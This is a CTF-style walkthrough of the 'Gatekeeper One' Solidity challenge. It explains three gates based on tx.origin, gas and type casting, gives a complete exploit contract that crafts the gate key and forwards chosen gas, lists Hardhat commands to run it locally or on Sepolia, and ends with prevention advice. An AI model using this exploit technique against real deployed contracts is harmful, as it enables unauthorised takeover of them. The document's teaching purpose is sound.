# Level 13: Gatekeeper One Challenge

## Challenge Description

This level introduces a contract with multiple "gates" that must be passed to become an "entrant". It combines concepts of gas manipulation, contract proxies, and bitwise operations to create a challenge that tests your understanding of Ethereum's lower-level mechanics.

## Contract Location

The challenge contract is located at:
```
/contracts/level-13-gatekeeper-1/GatekeeperOne.sol
```

## Understanding the Challenge

The `GatekeeperOne` contract has three gates (implemented as modifiers) that must be passed to call the `enter` function and become the entrant. Here's the contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

### The Gates

To become the entrant, you must pass all three gates:

1. **Gate One**: `require(msg.sender != tx.origin)`
   - This requires that the function call is not made directly by an externally owned account (EOA), but through another contract

2. **Gate Two**: `require(gasleft() % 8191 == 0)`
   - This requires that the amount of gas remaining at this point in the execution is divisible by 8191
   - You need precise control over the gas sent in the transaction

3. **Gate Three**: Three conditions on the `_gateKey` parameter:
   - `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`
   - `uint32(uint64(_gateKey)) != uint64(_gateKey)`
   - `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`

## Winning Strategy

To pass all gates, you need to:

1. Create an intermediary contract that will call the GatekeeperOne contract (for Gate One)
2. Find the correct gas amount to send with your transaction (for Gate Two)
3. Craft a special `bytes8` key that meets all three conditions of Gate Three

## Hint for Thinking

Ask yourself:
* How can you use an intermediary contract to bypass Gate One?
* How can you determine the exact gas needed to make `gasleft() % 8191 == 0`?
* How do type conversions in Solidity work with masking operations?
* How can you use bitwise operations to craft a key that meets all requirements in Gate Three?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

The solution involves creating an exploit contract that can bypass all three gates.

### Gate One Solution

Gate One requires `msg.sender != tx.origin`. This is straightforward to bypass by using a contract to make the call. When a contract calls another contract, `msg.sender` is the address of the calling contract, while `tx.origin` is the address of the account that initiated the transaction.

### Gate Two Solution

Gate Two requires `gasleft() % 8191 == 0`. This is tricky because the gas consumption up to that point depends on many factors including:

- The exact compiler version used
- The optimization level
- The way the contract is deployed
- The specific blockchain network

The solution is to try a series of strategic gas values that might result in the remaining gas being divisible by 8191 at the exact moment the check happens. Some approaches include:

1. Try multiples of 8191 plus some offset (like 8191*10 + 100)
2. Try values that have worked in similar setups (around 24000-25500)
3. Try a systematic approach by testing a range of values in small increments

This is implemented in our execution script, which tries multiple pre-selected values that are likely to work.

### Gate Three Solution

Gate Three has three requirements for the `bytes8 _gateKey`:

1. `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`
2. `uint32(uint64(_gateKey)) != uint64(_gateKey)`
3. `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`

To understand these requirements:

1. The first one means that the key's lower 16 bits must be the same as its lower 32 bits
2. The second one means that bits 32-63 must not be all zeros
3. The third one means the lower 32 bits must equal the lower 16 bits of the caller's address

The solution is to craft a key with:
- Lower 16 bits matching the caller's address's lower 16 bits
- Set bits 16-31 to zero (ensuring condition 1)
- Set some bits in positions 32-63 to non-zero (ensuring condition 2)

### Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external view returns (address);
}

contract GatekeeperOneExploit {
    address public owner;
    address public gatekeeperAddress;
    bool public success;
    uint256 public gasToUse;
    
    constructor(address _gatekeeperAddress) {
        owner = msg.sender;
        gatekeeperAddress = _gatekeeperAddress;
    }
    
    function generateGateKey(address _origin) public pure returns (bytes8) {
        // We need to craft a key that meets three conditions:
        // 1. uint32(uint64(key)) == uint16(uint64(key))
        //    This means the lower 2 bytes must match when converting to uint16 and uint32
        //    So bytes 2-3 must be 0
        //
        // 2. uint32(uint64(key)) != uint64(key)
        //    This means at least some bits in bytes 4-7 must be non-zero
        //
        // 3. uint32(uint64(key)) == uint16(uint160(tx.origin))
        //    This means the lower 2 bytes must match the lower 2 bytes of tx.origin
        
        // Extract the last 2 bytes (16 bits) of the address
        uint16 addressPart = uint16(uint160(_origin));
        
        // For condition 1 and 3: Create a key where the lower 16 bits are the address bits
        // and bytes 2-3 are zeros
        uint64 key = uint64(addressPart);
        
        // For condition 2: Make sure bytes 4-7 have some non-zero bits
        // We'll set them all to 1s
        key = key | (uint64(0xFFFFFFFF00000000));
        
        return bytes8(key);
    }
    
    function enterGate(uint256 _gasToUse) external {
        require(msg.sender == owner, "Only owner can call");
        gasToUse = _gasToUse;
        
        // Generate the gate key based on tx.origin (the original caller)
        bytes8 gateKey = generateGateKey(tx.origin);
        
        // Call the enter function with the specified gas
        // Make sure we have a high enough gas limit for the overall transaction
        // but control the gas sent to the target contract
        bool result = IGatekeeperOne(gatekeeperAddress).enter{gas: _gasToUse}(gateKey);
        
        success = result;
    }
    
    function checkSuccess() external view returns (bool) {
        address entrant = IGatekeeperOne(gatekeeperAddress).entrant();
        return entrant == tx.origin;
    }
}
```

## Step-by-Step Solution Guide

### 1. Deploy the GatekeeperOne Contract

If you're testing locally, deploy the GatekeeperOne contract first:

```shell
npx hardhat deploy --tags gatekeeper-one
```

### 2. Deploy the GatekeeperOneExploit Contract

Deploy the GatekeeperOneExploit contract targeting the GatekeeperOne contract:

```shell
npx hardhat deploy --tags gatekeeper-one-solution
```

Or with a specific GatekeeperOne contract address:

```shell
TARGET_ADDRESS=0xYourGatekeeperOneAddress npx hardhat deploy --tags gatekeeper-one-solution --network sepolia
```

### 3. Execute the Exploit

Run the provided script to execute the attack:

```shell
# If running on a testnet like Sepolia
EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-13-gatekeeper-1/execute-gatekeeper-one-exploit.ts --network sepolia

# If running locally
EXPLOIT_ADDRESS=0xYourExploitAddress npx hardhat run scripts/level-13-gatekeeper-1/execute-gatekeeper-one-exploit.ts --network localhost
```

Parameters:
- `EXPLOIT_ADDRESS`: Required - the address of your deployed GatekeeperOneExploit contract
- `TARGET_ADDRESS`: Optional - will use the target address stored in the exploit contract if not provided

The script will:
1. Generate the correct gate key for your address to pass Gate Three
2. Try a series of carefully selected gas values that are likely to work for Gate Two
3. Call the enter function through your exploit contract to pass Gate One
4. Verify that you've successfully become the entrant

Note: Finding the correct gas value might require multiple attempts. The script tries several values that have worked in practice, but if none work, you might need to adjust the gas values in the script based on your specific environment.

### 4. Verify Your Success

After executing the solution, verify that the `entrant` variable in the GatekeeperOne contract is set to your address.

## Lessons Learned

This challenge teaches important lessons about Ethereum's internals:

1. **Transaction Origin vs. Message Sender**: Understanding the distinction between `tx.origin` and `msg.sender` is crucial for contract security.

2. **Gas Manipulation**: Gas management in Ethereum is complex, and contracts that depend on specific gas amounts can be vulnerable to exploitation.

3. **Type Conversions**: Solidity's type conversion rules can create subtle bugs or vulnerabilities when not fully understood.

4. **Bitwise Operations**: Mastering bitwise operations is essential for solving complex challenges in smart contracts.

5. **Contract-to-Contract Interaction**: The ability to call contracts from other contracts creates powerful composition but also potential security risks.

## Prevention Strategies

To avoid similar vulnerabilities in your contracts:

1. **Avoid `tx.origin` for Authorization**: Never use `tx.origin` for authorization checks; prefer `msg.sender`.

2. **Don't Rely on Specific Gas Values**: Avoid making contract logic dependent on specific gas amounts, as these can change with protocol upgrades.

3. **Be Careful with Type Conversions**: When working with type conversions, be explicit about your intentions and test edge cases.

4. **Protect Against Intermediary Contracts**: Consider whether your contract could be exploited through an intermediary contract.

5. **Rigorous Testing**: Complex contracts with multiple checks require thorough testing, including fuzzing and formal verification.
